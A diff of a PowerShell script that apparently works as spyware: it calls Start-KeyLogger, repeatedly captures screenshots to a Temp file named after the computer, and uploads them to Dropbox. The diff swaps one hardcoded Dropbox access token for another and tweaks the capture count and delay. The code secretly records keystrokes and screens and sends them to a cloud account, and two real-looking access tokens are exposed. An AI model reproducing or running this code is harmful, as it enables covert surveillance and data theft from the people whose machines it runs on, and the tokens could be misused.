@@ -7,7 +7,7 @@ param (
 [Alias("f")]
 [string]$SourceFilePath
 ) 
-$DropBoxAccessToken = "sl.Bc2T88r0BNarQXnocKIUkLPdfRAniw8sY8PgVo0UXaYcAGUwjxg0W7a2K_1OVsVzit_QRIaOSPk1JjULyGV47SVE6KTlW4xfYFdKC1OTHgkguryEtoLBnuU0vHe5PlqW6PdsfHE"   # Replace with your DropBox Access Token
+$DropBoxAccessToken = "sl.Bc20acOqLkSYn4l9rtQi_l5kBSQVvCIdcL9cxWzEuBHPexDJjgP5ZPxlSXhf4BkZxo5UWExGjqNJyK5DXMYb-CWjTidfwsbpt9-q0VB10af-7lYVkzKRfi74rRXiaR83fqM63TA"   # Replace with your DropBox Access Token
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -129,7 +129,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Start-KeyLogger
 
 $i = 0
-while($i -lt 15){
+while($i -lt 3){
 
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
@@ -152,7 +152,7 @@ while($i -lt 15){
   
   $i++
   <#start-sleep -Seconds 15#>
-  start-sleep -Seconds 5
+  start-sleep -Seconds 10
  "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture1.png" | DropBox-Upload2
 }
 
